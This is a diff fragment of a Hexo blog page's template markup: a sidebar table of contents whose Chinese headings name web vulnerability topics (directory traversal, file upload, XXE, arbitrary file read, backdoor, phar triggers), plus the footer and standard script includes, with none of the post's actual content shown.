+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web2"><span class="nav-number">2.</span> <span class="nav-text">web2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#目录穿越漏洞"><span class="nav-number">2.1.</span> <span class="nav-text">目录穿越漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#合并文件处的文件上传漏洞"><span class="nav-number">2.2.</span> <span class="nav-text">合并文件处的文件上传漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#文件上传利用"><span class="nav-number">2.2.1.</span> <span class="nav-text">文件上传利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#后台任意文件读取"><span class="nav-number">2.3.</span> <span class="nav-text">后台任意文件读取</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web3"><span class="nav-number">3.</span> <span class="nav-text">web3</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#xxe"><span class="nav-number">3.1.</span> <span class="nav-text">xxe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#任意文件读取"><span class="nav-number">3.2.</span> <span class="nav-text">任意文件读取</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#后门"><span class="nav-number">3.3.</span> <span class="nav-text">后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#后台template-任意文件读取"><span class="nav-number">3.4.</span> <span class="nav-text">后台template 任意文件读取</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phar触发点"><span class="nav-number">3.5.</span> <span class="nav-text">phar触发点</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#小结"><span class="nav-number">4.</span> <span class="nav-text">小结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">star</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
